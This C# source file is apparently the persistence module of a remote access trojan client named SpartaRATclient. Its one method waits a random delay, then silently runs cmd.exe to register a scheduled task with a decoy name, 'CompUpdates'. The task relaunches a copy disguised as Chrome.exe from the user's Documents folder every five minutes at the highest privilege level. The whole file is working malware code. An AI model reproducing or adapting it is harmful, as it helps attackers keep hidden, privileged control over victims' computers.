using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Reflection;
using System.Threading;

namespace SpartaRATclient
{
    public class schtask
    {
        //Persistence
        public void Create()
        {
            Random rnd = new Random();
            Thread.Sleep(rnd.Next(70_000, 100_000));

            string NewPathToCopyFileInto = @"C:\Users\" + Environment.UserName + @"\Documents\Chrome.exe";

            var proc = new Process
            {
                StartInfo = new ProcessStartInfo
                {
                    Arguments = "/C schtasks /create /sc minute /mo 5 /tn CompUpdates /tr \"" + NewPathToCopyFileInto + "\" /rl HIGHEST",
                    UseShellExecute = false,
                    CreateNoWindow = true,
                    FileName = "cmd.exe",
                }
            };
            proc.Start();
            proc.WaitForExit();
        }
    }
}
